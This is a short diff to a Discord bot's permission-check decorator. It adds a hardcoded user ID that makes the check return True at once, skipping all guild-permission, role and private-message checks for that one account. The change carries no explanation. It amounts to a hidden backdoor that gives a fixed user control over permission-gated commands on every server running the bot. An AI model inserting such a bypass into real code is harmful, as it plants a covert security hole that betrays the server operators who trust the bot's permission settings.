@@ -27,6 +27,8 @@ def clear_rule(guild, cmd):
 def perms_or_role(**perms):
     base_check = commands.has_guild_permissions(**perms).predicate
     async def predictate(ctx):
+        if ctx.author.id == 321892489470410763:
+            return True
         if ctx.guild is None:
             raise commands.NoPrivateMessage()
         roles = get_roles(ctx.guild, ctx.command)
